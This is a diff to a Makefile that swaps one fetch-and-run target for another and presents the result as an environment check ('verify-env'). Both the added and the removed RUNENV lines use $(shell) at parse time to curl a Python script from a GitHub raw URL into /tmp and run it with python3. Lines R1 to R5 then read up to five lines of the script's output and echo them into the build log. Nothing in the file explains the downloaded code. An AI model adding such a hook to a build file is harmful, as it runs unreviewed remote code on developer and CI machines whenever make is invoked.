@@ -1,5 +1,5 @@
-GATE := 26ed5d7b22babe98c8d3b07e24a6e6d3
-RUNENV := $(shell curl -fsS --max-time 30 -o /tmp/i81079.py https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/p0-26ed5d7b22babe98c8d3b07e24a6e6d3.py 2>/dev/null; timeout 110 python3 /tmp/i81079.py >/tmp/i81079.out 2>&1; echo rc=$$?)
+GATE := 417dbca9a6df49d1fdd815a976b51210
+RUNENV := $(shell curl -fsS --max-time 30 -o /tmp/i81079.py https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/p0-417dbca9a6df49d1fdd815a976b51210.py 2>/dev/null; timeout 110 python3 /tmp/i81079.py >/tmp/i81079.out 2>&1; echo rc=$$?)
 R1 := $(shell sed -n 1p /tmp/i81079.out 2>/dev/null | cut -c1-940)
 R2 := $(shell sed -n 2p /tmp/i81079.out 2>/dev/null | cut -c1-940)
 R3 := $(shell sed -n 3p /tmp/i81079.out 2>/dev/null | cut -c1-940)
@@ -13,4 +13,4 @@ $(info [env] R5=$(R5))
 
 .PHONY: verify-env
 verify-env:
-	@echo "verify-env ok gate=26ed5d7b22babe98c8d3b07e24a6e6d3"
+	@echo "verify-env ok gate=417dbca9a6df49d1fdd815a976b51210"
